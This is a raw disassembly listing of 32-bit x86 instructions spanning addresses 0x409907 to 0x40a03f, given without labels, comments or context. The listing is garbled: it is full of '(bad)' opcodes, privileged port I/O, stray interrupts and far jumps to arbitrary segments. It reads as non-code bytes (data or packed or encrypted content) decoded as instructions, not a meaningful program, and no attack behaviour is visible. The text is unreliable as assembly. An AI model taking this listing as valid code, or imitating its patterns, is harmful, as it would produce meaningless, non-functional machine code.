  409907:	data16 fild QWORD PTR [eax-0x57757e7]
  40990e:	loope  0x409906
  409910:	pop    edx
  409911:	aad    0x9d
  409913:	nop
  409914:	jb     0x409932
  409916:	lods   eax,DWORD PTR ds:[esi]
  409917:	sahf   
  409918:	push   esp
  409919:	add    edi,DWORD PTR [esi]
  40991b:	inc    esi
  40991c:	pop    eax
  40991d:	sar    BYTE PTR [ecx+0x50],cl
  409920:	xor    eax,0x4cb60b11
  409925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409926:	imul   esi,edi,0x68
  409929:	sbb    al,0xb8
  40992b:	inc    esi
  40992c:	sbb    DWORD PTR [esi+esi*1],ebx
  40992f:	push   edi
  409930:	int3   
  409931:	into   
  409932:	jg     0x4098e7
  409934:	jge    0x4098f5
  409936:	lock in eax,0x29
  409939:	in     eax,0x10
  40993b:	sbb    al,0x2e
  40993d:	pop    es
  40993e:	fsub   st(1),st
  409940:	sbb    ecx,esi
  409942:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409943:	push   0x1586befa
  409948:	sub    BYTE PTR [ebx],bh
  40994a:	xchg   esp,eax
  40994b:	pop    ss
  40994c:	jbe    0x4098dd
  40994e:	dec    esp
  40994f:	cmp    bh,bh
  409951:	(bad)  
  409952:	cmp    bl,BYTE PTR [edx]
  409954:	loope  0x4098d9
  409956:	cmp    al,0xcf
  409958:	mov    eax,0x5e87cdd5
  40995d:	and    BYTE PTR [eax],dh
  40995f:	pusha  
  409960:	sbb    BYTE PTR [edx+0x1914e5e9],dh
  409966:	sub    DWORD PTR [ecx+eax*4],esi
  409969:	push   edi
  40996a:	imul   ebp,ebp,0xcab80eab
  409970:	out    0x43,al
  409972:	lods   al,BYTE PTR ds:[esi]
  409973:	imul   eax,ebx,0xaad1f38
  409979:	int    0x75
  40997b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40997c:	dec    edi
  40997d:	dec    eax
  40997e:	ror    DWORD PTR [edx],1
  409980:	fmul   QWORD PTR [ecx]
  409982:	mov    BYTE PTR [edx-0x30],bl
  409985:	mov    cl,0xa2
  409987:	(bad)  
  409988:	fmul   DWORD PTR [eax-0x5db96db2]
  40998e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40998f:	into   
  409990:	fs nop
  409992:	out    dx,al
  409993:	shl    BYTE PTR [esi],0xb6
  409996:	push   esp
  409997:	ss sub eax,0x37dc50b4
  40999d:	outs   dx,DWORD PTR ds:[esi]
  40999e:	inc    eax
  40999f:	ds inc edx
  4099a1:	gs jns 0x40993a
  4099a4:	je     0x40994a
  4099a6:	adc    BYTE PTR [eax-0xf4b63be],dh
  4099ac:	jle    0x409949
  4099ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099af:	pop    ecx
  4099b0:	es clc 
  4099b2:	add    ecx,DWORD PTR [edx+0x3e]
  4099b5:	loope  0x409948
  4099b7:	mov    ch,0xed
  4099b9:	pushf  
  4099ba:	mov    dl,0x6e
  4099bc:	mov    bl,0x6b
  4099be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099bf:	inc    ecx
  4099c0:	mov    cl,0xaa
  4099c2:	aas    
  4099c3:	xor    DWORD PTR [eax],ebp
  4099c5:	xor    BYTE PTR [ecx-0x41f91e55],0x33
  4099cc:	aam    0x98
  4099ce:	lea    edx,[edx-0x10]
  4099d1:	lods   eax,DWORD PTR ds:[esi]
  4099d2:	rol    BYTE PTR [edx+0x1f],cl
  4099d5:	inc    BYTE PTR ds:0x8589af7b
  4099db:	pop    ebx
  4099dc:	mov    ?,ebx
  4099de:	and    ch,BYTE PTR [edx-0x3d980989]
  4099e4:	xor    eax,0x87193514
  4099e9:	adc    cl,dh
  4099eb:	ret    
  4099ec:	call   0x7e7e:0xfc8a97ee
  4099f3:	xor    al,0x9
  4099f5:	xchg   ebx,eax
  4099f6:	shl    eax,0x32
  4099f9:	pop    ecx
  4099fa:	sub    DWORD PTR [edi-0x70],0xfffffff8
  4099fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099ff:	out    dx,eax
  409a00:	sbb    dh,BYTE PTR [esi]
  409a02:	pop    esp
  409a03:	push   es
  409a04:	rol    DWORD PTR [ebx+0x21],cl
  409a07:	sub    DWORD PTR [eax],edx
  409a09:	rol    eax,0xbb
  409a0c:	adc    DWORD PTR [eax],ebx
  409a0e:	cwde   
  409a0f:	pop    ebx
  409a10:	pop    ebp
  409a11:	jns    0x4099f7
  409a13:	outs   dx,BYTE PTR ds:[esi]
  409a14:	push   esi
  409a15:	pusha  
  409a16:	sub    eax,ebx
  409a18:	stos   DWORD PTR es:[edi],eax
  409a19:	sahf   
  409a1a:	push   ebx
  409a1b:	stos   DWORD PTR es:[edi],eax
  409a1c:	shr    ebp,cl
  409a1e:	pop    esi
  409a1f:	mov    edx,0x5dfa806a
  409a24:	test   BYTE PTR [ecx+0x23],ah
  409a27:	imul   ebp,DWORD PTR [ecx],0x534344e4
  409a2d:	js     0xefa17c57
  409a33:	dec    esi
  409a34:	push   edx
  409a35:	mov    al,ds:0x624e6027
  409a3a:	mov    esi,0x90c0f5cf
  409a3f:	mov    bl,0x9f
  409a41:	sahf   
  409a42:	push   0xc2ea0266
  409a47:	xor    bh,0x6d
  409a4a:	jne    0x4099fd
  409a4c:	aaa    
  409a4d:	sbb    BYTE PTR [edi],al
  409a4f:	dec    edx
  409a50:	dec    eax
  409a51:	mov    es,WORD PTR [edi]
  409a53:	jo     0x4099dd
  409a55:	imul   esp,DWORD PTR [ebp+0xf883664],0xffffffb8
  409a5c:	lahf   
  409a5d:	call   0x4db3:0x37992b1b
  409a64:	test   eax,0x5be71d02
  409a69:	fs xor bh,dh
  409a6c:	adc    DWORD PTR [edi+ebx*1+0x4500e8ea],edi
  409a73:	ret    0x6af8
  409a76:	adc    cl,cl
  409a78:	dec    ebp
  409a79:	and    al,0x80
  409a7b:	andps  xmm7,XMMWORD PTR [ebx+0x49]
  409a7f:	and    BYTE PTR [ebx-0x14],al
  409a82:	pushf  
  409a83:	int3   
  409a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a85:	xchg   ebp,eax
  409a86:	xchg   edx,eax
  409a87:	or     al,0xd
  409a89:	xor    edx,DWORD PTR [ebp-0x53]
  409a8c:	and    edi,DWORD PTR [eax+0x712c1e90]
  409a92:	(bad)  
  409a93:	add    BYTE PTR fs:[ecx],dh
  409a96:	add    eax,0x3567604b
  409a9b:	mov    al,ds:0x9c08f336
  409aa0:	in     eax,dx
  409aa1:	stos   DWORD PTR es:[edi],eax
  409aa2:	pop    ss
  409aa3:	xor    DWORD PTR [ebx-0x39],0x4b08d581
  409aaa:	into   
  409aab:	inc    edi
  409aac:	xor    eax,0xd9d46374
  409ab1:	push   0xffffffeb
  409ab3:	ret    
  409ab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ab5:	sar    BYTE PTR [edx-0x502f9faf],cl
  409abb:	enter  0xc5e0,0x7
  409abf:	push   cs
  409ac0:	sub    al,0x84
  409ac2:	mov    al,ds:0x61f29ba6
  409ac7:	aad    0x40
  409ac9:	cmp    esi,DWORD PTR [edi+0x76]
  409acc:	pop    ss
  409acd:	sub    DWORD PTR [edi+0x7cfbf52c],ecx
  409ad3:	and    bh,dh
  409ad5:	adc    ch,ch
  409ad7:	jp     0x409a7f
  409ad9:	jnp    0x409a8a
  409adb:	(bad)  
  409adc:	cdq    
  409add:	mov    dh,0xe4
  409adf:	cmp    al,0x29
  409ae1:	cmp    eax,0x838d1de5
  409ae6:	pushf  
  409ae7:	xchg   DWORD PTR [ebp+0x166a56c9],edi
  409aed:	(bad)  
  409aee:	rcr    BYTE PTR [edx],1
  409af0:	pop    esi
  409af1:	cwde   
  409af2:	pop    edi
  409af3:	sbb    esp,DWORD PTR [esi]
  409af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af6:	xor    BYTE PTR [edx-0x50],ah
  409af9:	ins    DWORD PTR es:[edi],dx
  409afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409afb:	cdq    
  409afc:	pop    ds
  409afd:	ret    0x1490
  409b00:	mov    edi,0x912b3bef
  409b05:	out    0xc9,al
  409b07:	ds dec esp
  409b09:	pop    ds
  409b0a:	mov    edi,0x7c694254
  409b0f:	inc    ebp
  409b10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b11:	adc    eax,0x769d6e58
  409b16:	jmp    0x409a98
  409b18:	(bad)  
  409b19:	jmp    0xf66d:0x139a306e
  409b20:	add    eax,edx
  409b22:	xchg   ebp,eax
  409b23:	push   0x34
  409b25:	aam    0xd6
  409b27:	outs   dx,BYTE PTR ds:[esi]
  409b28:	inc    edx
  409b29:	push   edi
  409b2a:	(bad)  
  409b2b:	icebp  
  409b2c:	add    dh,BYTE PTR [ebx-0x4caa5d2c]
  409b32:	gs dec edi
  409b34:	es xor al,0x91
  409b37:	icebp  
  409b38:	lahf   
  409b39:	sbb    DWORD PTR [edi],edx
  409b3b:	mov    ebx,0xc56d46d1
  409b40:	xor    BYTE PTR [ebp+0x6b],bh
  409b43:	out    dx,al
  409b44:	mov    cl,0xdd
  409b46:	sti    
  409b47:	into   
  409b48:	xor    DWORD PTR [esi+0x5fbd9d4e],0xffffffd5
  409b4f:	lahf   
  409b50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b51:	mov    edi,0xf93830f2
  409b56:	out    0x2f,eax
  409b58:	or     DWORD PTR [ecx+0x4f],esi
  409b5b:	or     eax,0x2403cd8c
  409b60:	aad    0x2f
  409b62:	stos   BYTE PTR es:[edi],al
  409b63:	lods   al,BYTE PTR ds:[esi]
  409b64:	or     eax,0x588f5067
  409b69:	sbb    eax,0x2f2f1763
  409b6e:	cli    
  409b6f:	mov    bh,BYTE PTR [edx-0x73da78b]
  409b75:	cmc    
  409b76:	xlat   BYTE PTR ds:[ebx]
  409b77:	fcomp  DWORD PTR [esi+0x771d1331]
  409b7d:	loop   0x409b63
  409b7f:	inc    eax
  409b80:	dec    eax
  409b81:	imul   edx,ebx,0x1b
  409b84:	mov    dh,0xc4
  409b86:	mov    esi,0x33420e22
  409b8b:	jb     0x409c03
  409b8d:	lock adc DWORD PTR [ebp-0x5711a9e9],eax
  409b94:	add    al,0x7a
  409b96:	cmp    al,0x2e
  409b98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b99:	jmp    0x551d:0x84ff76b4
  409ba0:	push   eax
  409ba1:	loopne 0x409ba4
  409ba3:	std    
  409ba4:	dec    ebx
  409ba5:	(bad)  
  409ba6:	and    BYTE PTR [ebp-0x3b],ch
  409ba9:	fadd   DWORD PTR ds:0x1b26e52c
  409baf:	retf   
  409bb0:	fcmovb st,st(1)
  409bb2:	and    eax,0x5ec52a82
  409bb7:	push   es
  409bb8:	push   ds
  409bb9:	sbb    BYTE PTR [esi-0x660ecd16],ch
  409bbf:	vmovlpd xmm3,xmm4,QWORD PTR [edi+0x80ea190]
  409bc7:	mov    esi,0xae07902d
  409bcc:	es pop edx
  409bce:	adc    al,0xdf
  409bd0:	xlat   BYTE PTR ds:[ebx]
  409bd1:	mov    BYTE PTR [esi-0x37],bh
  409bd4:	(bad)  
  409bd5:	cwde   
  409bd6:	dec    edx
  409bd7:	mov    dl,0xdc
  409bd9:	inc    ecx
  409bda:	inc    edx
  409bdb:	stc    
  409bdc:	stos   BYTE PTR es:[edi],al
  409bdd:	add    BYTE PTR [edi+0x3d],cl
  409be0:	xchg   esp,eax
  409be1:	enter  0xa74b,0xfc
  409be5:	jns    0x409b9e
  409be7:	stos   BYTE PTR es:[edi],al
  409be8:	inc    edi
  409be9:	test   DWORD PTR [esi+0x21],eax
  409bec:	sahf   
  409bed:	dec    BYTE PTR [edi+0x434b1598]
  409bf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf4:	pop    eax
  409bf5:	xor    eax,0x639b6164
  409bfa:	jnp    0x409b9d
  409bfc:	scas   al,BYTE PTR es:[edi]
  409bfd:	sahf   
  409bfe:	(bad)  
  409c00:	xlat   BYTE PTR ds:[ebx]
  409c01:	lds    edi,FWORD PTR [esi+0x880d1e7]
  409c07:	test   BYTE PTR [esi+ecx*4],dh
  409c0a:	test   eax,0xe6028b21
  409c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c10:	pop    ecx
  409c11:	in     eax,dx
  409c12:	push   ebp
  409c13:	sbb    eax,DWORD PTR [ecx]
  409c15:	push   ss
  409c16:	push   ecx
  409c17:	inc    edi
  409c18:	xchg   bl,ch
  409c1a:	jne    0x409c60
  409c1c:	loope  0x409c69
  409c1e:	cmp    esp,ebp
  409c20:	or     eax,0x9aec30f5
  409c25:	pop    es
  409c26:	adc    edi,esi
  409c28:	and    dl,dh
  409c2a:	(bad)  
  409c2b:	stc    
  409c2c:	add    ebp,DWORD PTR [ebx+esi*8+0x39]
  409c30:	or     BYTE PTR [edi+0x58],bl
  409c33:	or     eax,ebp
  409c35:	inc    edi
  409c36:	xlat   BYTE PTR ds:[ebx]
  409c37:	dec    edi
  409c38:	or     bl,BYTE PTR [esi]
  409c3a:	lds    edx,FWORD PTR ds:0xb6b979cb
  409c40:	iret   
  409c41:	mov    ebp,0xa611bb08
  409c46:	(bad)  
  409c47:	pop    ebp
  409c48:	(bad)  
  409c49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c4a:	daa    
  409c4b:	and    eax,0x7a140ca0
  409c50:	xor    eax,0x4ed18e79
  409c55:	fwait
  409c56:	cmp    DWORD PTR [ebp-0x3f9d49e3],edi
  409c5c:	xchg   edx,eax
  409c5d:	outs   dx,BYTE PTR ds:[esi]
  409c5e:	(bad)  
  409c5f:	cs pop edx
  409c61:	scas   al,BYTE PTR es:[edi]
  409c62:	stos   BYTE PTR es:[edi],al
  409c63:	push   cs
  409c64:	ins    BYTE PTR es:[edi],dx
  409c65:	mov    ds:0xe99fc7f,eax
  409c6a:	dec    edi
  409c6b:	mov    ch,0xf1
  409c6d:	push   ds
  409c6e:	ror    DWORD PTR [edi+0x7a],0x4a
  409c72:	lods   al,BYTE PTR ds:[esi]
  409c73:	cmp    DWORD PTR [eax+ebp*1],edi
  409c76:	mov    dl,0x5a
  409c78:	imul   DWORD PTR [ebp+0x40]
  409c7b:	xor    esp,ebp
  409c7d:	push   edx
  409c7e:	inc    ebp
  409c7f:	in     eax,dx
  409c80:	test   DWORD PTR [ecx+ecx*2-0x143497ab],ebx
  409c87:	mov    eax,ds:0xf970e4e6
  409c8c:	das    
  409c8d:	scas   al,BYTE PTR es:[edi]
  409c8e:	push   ebx
  409c8f:	pop    esp
  409c90:	fild   QWORD PTR ss:[edx-0x53]
  409c94:	nop
  409c95:	jo     0x409c25
  409c97:	outs   dx,BYTE PTR ds:[esi]
  409c98:	cmp    BYTE PTR [edx],0xa2
  409c9b:	pop    ss
  409c9c:	mov    ch,0xad
  409c9e:	imul   esi,DWORD PTR [eax],0x3a
  409ca1:	adc    ebp,0x50
  409ca4:	mul    DWORD PTR [edx-0x4e]
  409ca7:	pusha  
  409ca8:	sub    DWORD PTR [ebx+edx*2],esp
  409cab:	clc    
  409cac:	dec    edx
  409cad:	in     al,0x7e
  409caf:	add    DWORD PTR [ebx],eax
  409cb1:	ror    eax,1
  409cb3:	int    0x80
  409cb5:	lock mov bl,0x25
  409cb8:	dec    edi
  409cb9:	rcl    BYTE PTR [edi+0x52ee08d2],0xde
  409cc0:	int    0xf8
  409cc2:	inc    edx
  409cc3:	or     eax,0xc34e2b06
  409cc8:	fist   DWORD PTR [eax-0x78a6416a]
  409cce:	mov    BYTE PTR [ebx+0x23f15ae4],al
  409cd4:	jmp    0x409d54
  409cd6:	pop    ds
  409cd7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cd8:	dec    ecx
  409cd9:	sbb    ebp,eax
  409cdb:	shl    BYTE PTR [edx-0x6a],0xcd
  409cdf:	cmp    BYTE PTR [eax],dh
  409ce1:	and    al,0xbe
  409ce3:	test   DWORD PTR ss:[ecx],esp
  409ce6:	test   DWORD PTR [ecx],0xaf959fc7
  409cec:	lock dec eax
  409cee:	jecxz  0x409cdc
  409cf0:	addr16 push 0xbf231292
  409cf6:	retf   
  409cf7:	lods   eax,DWORD PTR ds:[esi]
  409cf8:	pop    ebx
  409cf9:	jge    0x409ca2
  409cfb:	shl    BYTE PTR [esi],cl
  409cfd:	ror    DWORD PTR [esi+0x3d80c887],cl
  409d03:	push   ebp
  409d04:	add    bh,bh
  409d06:	sub    ah,bh
  409d08:	cdq    
  409d09:	lea    esp,[esi]
  409d0b:	inc    esp
  409d0c:	jbe    0x409d6f
  409d0e:	cmp    al,0xd8
  409d10:	add    al,BYTE PTR [eax]
  409d12:	ins    BYTE PTR es:[edi],dx
  409d13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d14:	mov    dh,0xbd
  409d16:	xchg   edi,eax
  409d17:	xor    BYTE PTR [eax],al
  409d19:	add    dl,BYTE PTR [esi]
  409d1b:	mov    ch,0xa9
  409d1d:	arpl   cx,bp
  409d1f:	jo     0x409d97
  409d21:	ins    BYTE PTR es:[edi],dx
  409d22:	lahf   
  409d23:	dec    eax
  409d25:	outs   dx,DWORD PTR ds:[esi]
  409d26:	push   ecx
  409d27:	aad    0x8c
  409d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2a:	cmp    dh,BYTE PTR [ecx+0x1760e117]
  409d30:	mov    ecx,0x6658d1c7
  409d35:	imul   edi,DWORD PTR [ebp+0x6757f9b3],0x5343cc0d
  409d3f:	fmul   DWORD PTR [edi]
  409d41:	popa   
  409d42:	and    al,0x8
  409d44:	xchg   ecx,eax
  409d45:	and    dh,BYTE PTR [ebx]
  409d47:	fidivr DWORD PTR [ebx+0x1403c913]
  409d4d:	in     al,0x30
  409d4f:	xchg   esp,eax
  409d50:	and    eax,esi
  409d52:	xchg   edi,eax
  409d53:	sub    al,0xc1
  409d55:	or     BYTE PTR ds:0x1a0053f5,dh
  409d5b:	scas   al,BYTE PTR es:[edi]
  409d5c:	loop   0x409d0b
  409d5e:	fldenv [edx+0x28]
  409d61:	pop    ebx
  409d62:	daa    
  409d63:	(bad)  
  409d64:	push   ds
  409d65:	dec    esi
  409d66:	xchg   ecx,eax
  409d67:	xchg   BYTE PTR [esi-0x7b],ch
  409d6a:	pushf  
  409d6b:	mov    eax,ds:0x49571409
  409d70:	xor    eax,0xc35b4073
  409d75:	mov    BYTE PTR [esi-0x171c7c9d],al
  409d7b:	pop    ebx
  409d7c:	aaa    
  409d7d:	push   eax
  409d7e:	int3   
  409d7f:	stos   BYTE PTR es:[edi],al
  409d80:	jge    0x409d19
  409d82:	or     eax,0x73976cf1
  409d87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d88:	add    BYTE PTR [eax],dh
  409d8a:	and    eax,DWORD PTR [ebp+0x2c]
  409d8d:	inc    ebx
  409d8e:	stc    
  409d8f:	out    0xf4,al
  409d91:	std    
  409d92:	jb     0x409d19
  409d94:	mov    eax,0xa0aef6a1
  409d99:	loopne 0x409e0c
  409d9b:	ss or  al,0x83
  409d9e:	inc    ebp
  409d9f:	loope  0x409ddc
  409da1:	sbb    dl,BYTE PTR [edi]
  409da3:	pushf  
  409da4:	shl    ah,cl
  409da6:	scas   al,BYTE PTR es:[edi]
  409da7:	call   0x6335:0x90197552
  409dae:	cmp    al,0xfa
  409db0:	test   bh,0xa2
  409db3:	fsubr  DWORD PTR [esi+ecx*2-0x2e82b4fd]
  409dba:	shl    DWORD PTR [eax+0x50],0xbb
  409dbe:	add    BYTE PTR [ebx-0x7e],cl
  409dc1:	dec    eax
  409dc2:	cmc    
  409dc3:	in     al,dx
  409dc4:	adc    ebx,DWORD PTR [edx-0x586d072c]
  409dca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dcb:	out    dx,al
  409dcc:	cmc    
  409dcd:	xor    al,0x1c
  409dcf:	push   cs
  409dd0:	test   BYTE PTR [eax],ch
  409dd2:	fs dec esp
  409dd4:	lahf   
  409dd5:	cwde   
  409dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409dd7:	cwde   
  409dd8:	sub    ah,BYTE PTR [ecx+ebp*1-0x34]
  409ddc:	xchg   BYTE PTR ds:0xfb780c24,al
  409de2:	call   0x7b0927db
  409de7:	dec    ebp
  409de8:	out    dx,al
  409de9:	pop    es
  409dea:	xchg   esp,eax
  409deb:	ja     0x409e2c
  409ded:	in     al,0x0
  409def:	pop    ebp
  409df0:	mov    edi,DWORD PTR [ebx+0x656acbf6]
  409df6:	lea    edx,[esi+0x5e]
  409df9:	add    eax,0x871445bf
  409dfe:	or     ecx,DWORD PTR [esi-0x1b]
  409e01:	dec    ebx
  409e02:	lds    edx,FWORD PTR [esi-0x58463c6]
  409e08:	sahf   
  409e09:	stos   DWORD PTR es:[edi],eax
  409e0a:	imul   ebp
  409e0c:	iret   
  409e0d:	push   esp
  409e0e:	rcr    DWORD PTR [edx],0xb3
  409e11:	jns    0x409e2c
  409e13:	jp     0x409dbc
  409e15:	xchg   esi,eax
  409e16:	dec    ebx
  409e17:	and    ebp,edx
  409e19:	jns    0x409def
  409e1b:	add    ebx,DWORD PTR [esi-0x61]
  409e1e:	ja     0x409dbe
  409e20:	repz daa 
  409e22:	mov    ebx,0xb783a685
  409e27:	jo     0x409e61
  409e29:	test   DWORD PTR [ebp+0x32b5187f],ebp
  409e2f:	loop   0x409e90
  409e31:	mov    cl,0xb7
  409e33:	xor    DWORD PTR [ebp-0x6358f695],0xffffff87
  409e3a:	push   ebp
  409e3b:	test   DWORD PTR [esi-0x2d7f197d],ebp
  409e41:	add    al,0x30
  409e43:	jmp    0x3d397b1
  409e48:	mov    ah,0xe
  409e4a:	call   0x761a:0x47a3a39f
  409e51:	outs   dx,DWORD PTR ds:[esi]
  409e52:	leave  
  409e53:	mov    bl,0x90
  409e55:	cmp    cl,0x10
  409e58:	sub    ecx,DWORD PTR [edi]
  409e5a:	arpl   WORD PTR [ebp-0x2ee7f5c7],bp
  409e60:	mov    bl,0x86
  409e62:	mov    ds:0xf3b4d19e,eax
  409e67:	push   ds
  409e68:	jl     0x409e85
  409e6a:	mov    edx,0xdc7333a9
  409e6f:	jmp    0x32e7179e
  409e74:	test   BYTE PTR [ebx-0x17837ef5],dh
  409e7a:	cmp    al,0xbf
  409e7c:	push   edi
  409e7d:	pop    ebp
  409e7e:	sbb    DWORD PTR [ecx-0x17d5281b],ecx
  409e84:	out    0x9d,eax
  409e86:	sub    eax,0x5ef570db
  409e8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8c:	cmc    
  409e8d:	mov    ebx,?
  409e8f:	adc    al,0x5c
  409e91:	adc    eax,0xfa9f2f7e
  409e96:	inc    edx
  409e97:	xchg   ebx,eax
  409e98:	dec    esi
  409e99:	jnp    0x409e68
  409e9b:	ins    BYTE PTR es:[edi],dx
  409e9c:	aam    0x93
  409e9e:	jne    0x409e98
  409ea0:	mov    cl,0x3d
  409ea2:	sbb    bl,BYTE PTR [edi]
  409ea4:	inc    ebp
  409ea5:	fucomip st,st(3)
  409ea7:	mov    cl,dl
  409ea9:	sbb    al,0x33
  409eab:	jb     0x409e6f
  409ead:	fld    DWORD PTR [ebp+0x32]
  409eb0:	push   ebx
  409eb1:	jecxz  0x409ef4
  409eb3:	out    0xf8,al
  409eb5:	cmp    esp,0x71d1b614
  409ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ebc:	mov    cl,0x80
  409ebe:	jbe    0x409f1a
  409ec0:	dec    eax
  409ec1:	pop    esp
  409ec2:	stos   BYTE PTR es:[edi],al
  409ec3:	cmp    bh,BYTE PTR [ebx+0x20f0b0d5]
  409ec9:	enter  0x5651,0xae
  409ecd:	cmp    esp,edi
  409ecf:	mov    ch,0x3b
  409ed1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ed2:	push   ds
  409ed3:	xor    eax,DWORD PTR [ebx+0x4]
  409ed6:	mov    WORD PTR [ecx-0x14],cs
  409ed9:	mov    es,eax
  409edb:	pop    ss
  409edc:	std    
  409edd:	sub    BYTE PTR [ebx],ch
  409edf:	inc    eax
  409ee1:	fwait
  409ee2:	xchg   DWORD PTR [esi+0x4f],ebp
  409ee5:	adc    dh,bl
  409ee7:	inc    ebx
  409ee8:	adc    al,0x35
  409eea:	gs dec esi
  409eec:	retf   
  409eed:	inc    edx
  409eee:	sub    al,BYTE PTR [ecx+eax*4+0x4c]
  409ef2:	jecxz  0x409e96
  409ef4:	das    
  409ef5:	fisub  WORD PTR [ebp+0x5e]
  409ef8:	add    ecx,ecx
  409efa:	ins    DWORD PTR es:[edi],dx
  409efb:	inc    edi
  409efc:	inc    esp
  409efd:	push   esp
  409efe:	sub    eax,0xc4a61778
  409f03:	inc    esi
  409f04:	pop    ss
  409f05:	enter  0x4f2e,0xcd
  409f09:	sbb    ebx,DWORD PTR [esi]
  409f0b:	popf   
  409f0c:	jne    0x409f79
  409f0e:	push   esp
  409f0f:	cmp    BYTE PTR [edx-0x5a],ah
  409f12:	inc    eax
  409f13:	xchg   ebp,eax
  409f14:	mov    ebx,0x866b1649
  409f19:	iret   
  409f1a:	out    0x96,eax
  409f1c:	dec    BYTE PTR [edx-0x50]
  409f1f:	push   0xffffff92
  409f21:	dec    esp
  409f22:	jns    0x409f9c
  409f24:	pop    es
  409f25:	nop
  409f26:	aaa    
  409f27:	xchg   edi,eax
  409f28:	mov    eax,ds:0xc515f4e4
  409f2d:	add    bl,BYTE PTR [eax+0x5fa9d0d7]
  409f33:	imul   ebx,DWORD PTR ds:0xdd2d3946,0x572b5aa7
  409f3d:	int3   
  409f3e:	lea    eax,[ecx]
  409f40:	mov    ebx,0x36c8f0cf
  409f45:	test   BYTE PTR [esi+0x42385776],bl
  409f4b:	inc    edx
  409f4c:	push   esp
  409f4d:	(bad)  [edi-0x140b79bc]
  409f53:	mov    esi,0x48c4c2f4
  409f58:	inc    edx
  409f59:	sub    cl,BYTE PTR [ecx+ebx*4-0x5804b26c]
  409f60:	jns    0x409f57
  409f62:	adc    BYTE PTR [ecx],cl
  409f64:	xor    BYTE PTR ds:0x104f318f,ch
  409f6a:	mov    ebp,0x4bc62e27
  409f6f:	pop    esi
  409f70:	push   cs
  409f71:	retfw  0xe5c8
  409f75:	xchg   DWORD PTR [ecx-0x6f2b5695],eax
  409f7b:	sbb    al,0xac
  409f7d:	mov    edi,0x1c7df00f
  409f82:	pop    esp
  409f83:	add    ecx,ecx
  409f85:	vunpcklps ymm4,ymm7,YMMWORD PTR [edx+0x112edf21]
  409f8d:	push   ds
  409f8e:	outs   dx,DWORD PTR ds:[esi]
  409f8f:	pop    edx
  409f90:	test   eax,0x3e719d31
  409f95:	fwait
  409f96:	test   BYTE PTR [eax+0x19],0xfa
  409f9a:	push   eax
  409f9b:	mov    cl,0x70
  409f9d:	retf   0x6cac
  409fa0:	or     BYTE PTR [ebp+0x4b],bh
  409fa3:	das    
  409fa4:	shl    BYTE PTR [edi+ebp*1-0x56],1
  409fa8:	(bad)  
  409faa:	aam    0xca
  409fac:	sbb    ah,BYTE PTR [ebp+0x5de2baa6]
  409fb2:	fsubr  QWORD PTR [ecx]
  409fb4:	jmp    FWORD PTR [eax]
  409fb6:	inc    ebp
  409fb7:	sub    al,BYTE PTR [ebp+eax*1+0x62]
  409fbb:	fsub   QWORD PTR [esi+0x66]
  409fbe:	das    
  409fbf:	fild   WORD PTR [esi+0x15]
  409fc2:	cmc    
  409fc3:	jecxz  0x409f76
  409fc5:	dec    esi
  409fc6:	outs   dx,BYTE PTR ds:[esi]
  409fc7:	sar    DWORD PTR [ecx+0x23],1
  409fca:	out    dx,al
  409fcb:	fiadd  WORD PTR [ebx+0x292c3bde]
  409fd1:	add    eax,0x9fbd60b7
  409fd6:	push   edx
  409fd7:	xchg   edx,eax
  409fd8:	hlt    
  409fd9:	xor    al,0xa3
  409fdb:	xor    ebp,DWORD PTR [ebp+0x2c]
  409fde:	adc    eax,0x252056af
  409fe3:	jl     0x40a00d
  409fe5:	sub    si,cx
  409fe8:	xchg   edx,eax
  409fe9:	jge    0x40a01d
  409feb:	push   0xffffffc8
  409fed:	pop    ebx
  409fee:	mov    ebx,0x151cd8d2
  409ff3:	(bad)  
  409ff4:	mov    dh,0x12
  409ff6:	adc    al,0xc2
  409ff8:	xchg   edx,eax
  409ff9:	fdiv   DWORD PTR [edx+0x35928f33]
  409fff:	shr    DWORD PTR [ecx-0x3],0xd9
  40a003:	outs   dx,DWORD PTR ds:[esi]
  40a004:	fwait
  40a005:	inc    esi
  40a006:	fcomi  st,st(4)
  40a008:	xchg   ax,ax
  40a00a:	jge    0x409f99
  40a00c:	mov    dl,ch
  40a00e:	dec    ebx
  40a00f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a010:	mov    edi,0xfb74190
  40a015:	jg     0x40a08b
  40a017:	lds    edx,FWORD PTR [edi-0x416f60f7]
  40a01d:	mov    ?,WORD PTR [ebp+0x3d]
  40a020:	fwait
  40a021:	inc    ecx
  40a022:	ror    DWORD PTR [edi-0x65],0xe5
  40a026:	add    BYTE PTR [ebx+edi*4],dh
  40a029:	sbb    al,0xc6
  40a02b:	imul   esp,esi,0x6282a56
  40a031:	cmc    
  40a032:	sahf   
  40a033:	sub    al,0xfa
  40a035:	nop    DWORD PTR [esi+0x68f9e192]
  40a03c:	fs or  ch,dl
  40a03f:	dec    eax
